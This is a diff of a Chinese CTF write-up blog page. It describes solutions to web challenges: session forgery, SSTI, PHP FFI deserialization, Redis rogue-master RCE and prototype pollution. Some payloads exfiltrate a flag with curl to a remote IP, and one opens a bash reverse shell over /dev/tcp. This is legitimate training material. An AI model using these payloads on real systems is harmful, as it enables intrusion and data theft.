-<h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>谢谢这道题，让我狠狠了解了一把curl怎么用</p>
+
+        <h2 id="BSidesCF-2020-Hurdles"   >
+          <a href="#BSidesCF-2020-Hurdles" class="heading-link"><i class="fas fa-link"></i></a><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2>
+      <p>谢谢这道题，让我狠狠了解了一把curl怎么用</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-X</span> PUT <span class="token string">'http://node4.buuoj.cn:26923/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a'</span> <span class="token parameter variable">-u</span> <span class="token string">'player:54ef36ec71201fdf9d1423fd26f97f6b'</span> <span class="token parameter variable">-A</span> <span class="token string">'1337 Browser v.9001'</span> <span class="token parameter variable">-H</span> <span class="token string">"X-Forwarded-For:13.37.13.37,127.0.0.1"</span> <span class="token parameter variable">-b</span> <span class="token string">"Fortune=6265"</span> <span class="token parameter variable">-H</span> <span class="token string">"Accept:text/plain"</span> <span class="token parameter variable">-H</span> <span class="token string">"Accept-Language:ru"</span> <span class="token parameter variable">-H</span> <span class="token string">"origin:https://ctf.bsidessf.net"</span> <span class="token parameter variable">-H</span> <span class="token string">"referer:https://ctf.bsidessf.net/challenges"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>curl使用方法</p>
@@ -2471,15 +2272,24 @@ a <span class="token operator">=</span> A<span class="token punctuation">(</span
 <span class="token parameter variable">--user</span> username:password <span class="token comment">#通过Basic Authentication验证</span>
 <span class="token parameter variable">-i</span> <span class="token comment">#显示完整响应</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><p>代码审计和SESSION文件伪造</p>
+
+        <h2 id="HarekazeCTF2019-Easy-Notes"   >
+          <a href="#HarekazeCTF2019-Easy-Notes" class="heading-link"><i class="fas fa-link"></i></a><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2>
+      <p>代码审计和SESSION文件伪造</p>
 <p>看拿flag的要求是<code>$SESSION[&#39;admin&#39;]==true</code>，在文件下载代码处可看到，生成文章打包后文件和SESSION文件存储在同一文件夹下，可以进行伪造，看文件名处理的代码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'-'</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$type</span><span class="token punctuation">;</span>
 <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// avoid path traversal</span>
 <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token constant">TEMP_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>此处将文件名命名为<code>用户名-随机8位16进制数.type参数</code>，并且如果有两个.还会将其替换为空，那么我们构造用户名为<code>sess_</code>，type为<code>.</code>最终生成的文件就是<code>sess_-随机8位16进制数</code>，刚好符合SESSION文件存储命名，而又因为下面生成文件使用的是zip方式打包，文本原样写入，我们只需要在文章标题处构造<code>admin|b:1;</code>就能被默认反序列化方式获取，而为了防止前后字符影响，构造标题为<code>xxxx|N;admin|b:1;xxxxxx</code>，通过下载获取SESSID，修改cookie即可</p>
-<h2 id="BSidesCF-2019-Pick-Tac-Toe"><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h2><p>看页面代码，按照对应字符传参可覆盖电脑步数</p>
-<h2 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2><p>禁用了一堆函数，并且带有openbase_dir，通过glob协议扫出flag在根目录，然后当前目录还有一个php文件，代码如下</p>
+
+        <h2 id="BSidesCF-2019-Pick-Tac-Toe"   >
+          <a href="#BSidesCF-2019-Pick-Tac-Toe" class="heading-link"><i class="fas fa-link"></i></a><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h2>
+      <p>看页面代码，按照对应字符传参可覆盖电脑步数</p>
+
+        <h2 id="RCTF-2019-Nextphp"   >
+          <a href="#RCTF-2019-Nextphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2>
+      <p>禁用了一堆函数，并且带有openbase_dir，通过glob协议扫出flag在根目录，然后当前目录还有一个php文件，代码如下</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
@@ -2523,7 +2333,7 @@ a <span class="token operator">=</span> A<span class="token punctuation">(</span
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>此处利用的是php7.4新引进的一项特性：<a target="_blank" rel="noopener" href="https://www.laruence.com/2020/03/11/5475.html">FFI扩展详解</a></p>
+<p>此处利用的是php7.4新引进的一项特性：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.laruence.com/2020/03/11/5475.html" >FFI扩展详解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <p>总体的FFI调用逻辑就是</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 		<span class="token variable">$a</span><span class="token operator">=</span><span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token constant">C</span>中的函数<span class="token function">A</span><span class="token punctuation">(</span><span class="token constant">C</span>中定义函数<span class="token constant">A</span>的参数<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">C</span>中的函数<span class="token function">B</span><span class="token punctuation">(</span><span class="token constant">C</span>中定义函数<span class="token constant">B</span>的参数<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"需要加在的动态库"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -2553,7 +2363,10 @@ a <span class="token operator">=</span> A<span class="token punctuation">(</span
 <pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;$a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#39;);
 $a-&gt; __serialize()[&#39;ret&#39;]-&gt;system(&#39;curl -d @&#x2F;flag 182.61.46.138:12345&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><p>合理怀疑SSTI，但是双花括号被过滤了，试试让程序报错，使用1/0，得到报错</p>
+
+        <h2 id="watevrCTF-2019-Supercalc"   >
+          <a href="#watevrCTF-2019-Supercalc" class="heading-link"><i class="fas fa-link"></i></a><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2>
+      <p>合理怀疑SSTI，但是双花括号被过滤了，试试让程序报错，使用1/0，得到报错</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162052551.png"></p>
 <p>那在后面贴上注释，看看里面会不会被执行，传入了没执行</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162053572.png"></p>
@@ -2562,7 +2375,10 @@ $a-&gt; __serialize()[&#39;ret&#39;]-&gt;system(&#39;curl -d @&#x2F;flag 182.61.
 <p>尝试直接传入提示长度过长，那就伪造session吧</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 *3.py encode <span class="token parameter variable">-s</span> <span class="token string">"cded826a1e89925035cc05f0907855f7"</span> <span class="token parameter variable">-t</span> <span class="token string">'&#123;"history":[&#123;"code":"__import__(\"os\").popen(\"cat flag.txt\").read()"&#125;]&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>伪造session，访问个404的网站，可以拿到<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code></p>
+
+        <h2 id="SWPU2019-Web3"   >
+          <a href="#SWPU2019-Web3" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2>
+      <p>伪造session，访问个404的网站，可以拿到<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code></p>
 <p>ID处base64解码发现是100，伪造成1试试</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 *3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &#39;&#123;&quot;id&quot;:&#123;&quot;b&quot;:&quot;1&quot;&#125;,&quot;is_login&quot;:True,&quot;password&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#39; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -2647,7 +2463,10 @@ $a-&gt; __serialize()[&#39;ret&#39;]-&gt;system(&#39;curl -d @&#x2F;flag 182.61.
 -y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>将其上传即可</p>
-<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>二次注入啊二次注入</p>
+
+        <h2 id="网鼎杯2018-Unfinish"   >
+          <a href="#网鼎杯2018-Unfinish" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2>
+      <p>二次注入啊二次注入</p>
 <p>偷个脚本</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64   <span class="token comment"># 用来解16进制</span>
 <span class="token keyword">import</span> re       <span class="token comment"># 正则匹配</span>
@@ -2699,7 +2518,10 @@ result<span class="token operator">=</span><span class="token string">""</span>
 
     <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><p>看代码，对上传文件的处理</p>
+
+        <h2 id="CSAWQual-2016-i-got-id"   >
+          <a href="#CSAWQual-2016-i-got-id" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2>
+      <p>看代码，对上传文件的处理</p>
 <pre class="line-numbers language-none"><code class="language-none">if ($cgi-&gt;upload(&#39;file&#39;)) &#123;
     my $file &#x3D; $cgi-&gt;param(&#39;file&#39;);
     while (&lt;$file&gt;) &#123;
@@ -2714,7 +2536,10 @@ result<span class="token operator">=</span><span class="token string">""</span>
 <p>对于读文件，如果传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。<br>所以，在上传的正常文件前加上一个文件上传项ARGV，然后在URL中传入文件路径参数，就可以读取任意文件。</p>
 </blockquote>
 <p>ARGV就是命令行参数</p>
-<h2 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2><p>看参数在event_important处有SSTI，再看cookie中有session，肯定是伪造没跑了，先捞出私钥<code>__class__.__init__.__globals__[app].config</code>，<code> &#39;SECRET_KEY&#39;: &#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#39;</code>，然后脚本伪造就行了</p>
+
+        <h2 id="FBCTF2019-Event"   >
+          <a href="#FBCTF2019-Event" class="heading-link"><i class="fas fa-link"></i></a><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2>
+      <p>看参数在event_important处有SSTI，再看cookie中有session，肯定是伪造没跑了，先捞出私钥<code>__class__.__init__.__globals__[app].config</code>，<code> &#39;SECRET_KEY&#39;: &#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#39;</code>，然后脚本伪造就行了</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
 <span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface
 app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
@@ -2725,15 +2550,24 @@ session_serializer <span class="token operator">=</span> SecureCookieSessionInte
     <span class="token keyword">print</span><span class="token punctuation">(</span>session_serializer<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 index<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2><p>先使用0.0.0.0拿到hint，<code>redispass is root</code>，说明目标应该是开启了redis服务并且密码是root，此处利用的是Redis主从复制来getshell</p>
+
+        <h2 id="网鼎杯-2020-玄武组-SSRFMe"   >
+          <a href="#网鼎杯-2020-玄武组-SSRFMe" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2>
+      <p>先使用0.0.0.0拿到hint，<code>redispass is root</code>，说明目标应该是开启了redis服务并且密码是root，此处利用的是Redis主从复制来getshell</p>
 <blockquote>
-<h3 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h3><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+
+        <h3 id="Redis主从复制"   >
+          <a href="#Redis主从复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h3>
+      <p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
 </blockquote>
 <p>所以我们这题的思路是，创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 slaveof 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机（slaver）加载模块执行系统命令即可。<br>首先需要这两个项目</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">恶意so</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">伪造主机</a></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server" >恶意so</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf" >伪造主机</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <p>将恶意so项目中的exp.so文件放到伪造主机项目的目录中，伪造主机项目中更改ssrf那个python文件来生成payload，然后使用server文件来开启伪装服务器，传入执行即可</p>
-<h2 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h2><p>给源码了，直接看重点</p>
+
+        <h2 id="网鼎杯-2020-青龙组-notes"   >
+          <a href="#网鼎杯-2020-青龙组-notes" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h2>
+      <p>给源码了，直接看重点</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> undefsafe <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'undefsafe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">edit_note</span><span class="token punctuation">(</span><span class="token parameter">id<span class="token punctuation">,</span> author<span class="token punctuation">,</span> raw</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id <span class="token operator">+</span> <span class="token string">'.author'</span><span class="token punctuation">,</span> author<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -2778,7 +2612,10 @@ app<span class="token punctuation">.</span><span class="token function">route</s
 <p>问题就出在对不存在的属性进行赋值的时候，传入<code>__proto__</code>就会导致原型链污染，看代码中<code>undefsafe(this.note_list, id + &#39;.author&#39;, author);</code>其中id和auther我们都可控，在author处放入我们想要执行的命令，id处构造<code>__proto__</code>即可完成原型链污染，导致信息传入命令执行</p>
 <pre class="line-numbers language-none"><code class="language-none">id&#x3D;__proto__&amp;author&#x3D;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F43.249.193.167%2F38901%200%3E%261&amp;raw&#x3D;kkk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="羊城杯-2020-Easyphp2"><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h2><p>进去先用双URL编码绕过waf读源码</p>
+
+        <h2 id="羊城杯-2020-Easyphp2"   >
+          <a href="#羊城杯-2020-Easyphp2" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h2>
+      <p>进去先用双URL编码绕过waf读源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'max_execution_time'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -2806,7 +2643,10 @@ app<span class="token punctuation">.</span><span class="token function">route</s
 <p>更改cookie中的pass，出了个文本框，内容传入count被执行，写个shell进去，然后蚁剑连接，找到flag.txt发现没有读取权限，看README解出密码<code>GWHTCTF</code>，使用su命令切换用户，读取flag</p>
 <pre class="line-numbers language-none"><code class="language-none">shell&#x3D;system(&quot;printf &#39;GWHTCTF&#39; | su  -c &#39;cat &#x2F;GWHT&#x2F;system&#x2F;of&#x2F;a&#x2F;down&#x2F;flag.txt&#39; GWHT&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><p>读文件，读源码，读下环境找到<code>secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh</code>，看session，明显一个pickle，伪造上传就行了</p>
+
+        <h2 id="HFCTF-2021-Final-easyflask"   >
+          <a href="#HFCTF-2021-Final-easyflask" class="heading-link"><i class="fas fa-link"></i></a><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2>
+      <p>读文件，读源码，读下环境找到<code>secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh</code>，看session，明显一个pickle，伪造上传就行了</p>
 <pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python3.6
 import os
 import pickle
@@ -2879,7 +2719,10 @@ User <span class="token operator">=</span> <span class="token builtin">type</spa
 u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2><p>这是一道关于node.js沙箱逃逸的问题<br>大致说一下 题目的描述，首先定义变量flag，然后我们可以在沙箱里面执行任意的命令，那我们如何逃逸出去呢？</p>
+
+        <h2 id="HITCON-2016-Leaking"   >
+          <a href="#HITCON-2016-Leaking" class="heading-link"><i class="fas fa-link"></i></a><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2>
+      <p>这是一道关于node.js沙箱逃逸的问题<br>大致说一下 题目的描述，首先定义变量flag，然后我们可以在沙箱里面执行任意的命令，那我们如何逃逸出去呢？</p>
 <blockquote>
 <p>在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。 </p>
 </blockquote>
@@ -2897,7 +2740,10 @@ response <span class="token operator">=</span> <span class="token string">''</sp
             <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
             <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p>给了源码，就不放了，直接看关键，首先是一个md5绕过，利用js弱类型相加、</p>
+
+        <h2 id="NPUCTF2020-验证🐎"   >
+          <a href="#NPUCTF2020-验证🐎" class="heading-link"><i class="fas fa-link"></i></a><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2>
+      <p>给了源码，就不放了，直接看关键，首先是一个md5绕过，利用js弱类型相加、</p>
 <pre class="line-numbers language-none"><code class="language-none">[1]+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;
 &#39;1&#39;+&#39;1&#39; &#x2F;&#x2F;&#39;11&#39;
 [1]!&#x3D;&#x3D;&#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -2936,7 +2782,10 @@ x &#x3D;&gt; x * x<span aria-hidden="true" class="line-numbers-rows"><span></spa
 <span class="token punctuation">)</span><span class="token punctuation">(</span>Math<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>同时使用了箭头函数和自调用函数，+1将Math转换为String类型传入，而后通过Function构造出一个函数并进行自调用来将返回值传入Math.x，最终的返回值也就是Math.x的值</p>
-<h2 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h2><p>俩文件，一个upload，一个example</p>
+
+        <h2 id="CISCN2021-Quals-upload"   >
+          <a href="#CISCN2021-Quals-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h2>
+      <p>俩文件，一个upload，一个example</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">//upload
 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -3035,7 +2884,10 @@ x &#x3D;&gt; x * x<span aria-hidden="true" class="line-numbers-rows"><span></spa
 
 
 
-<h2 id="羊城杯-2020-Blackcat"><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h2><p>音频最后有源码</p>
+
+        <h2 id="羊城杯-2020-Blackcat"   >
+          <a href="#羊城杯-2020-Blackcat" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h2>
+      <p>音频最后有源码</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 include &quot;initialized.php&quot;;
 putenv(&quot;clandestine&#x3D;&quot;.randomkeys());
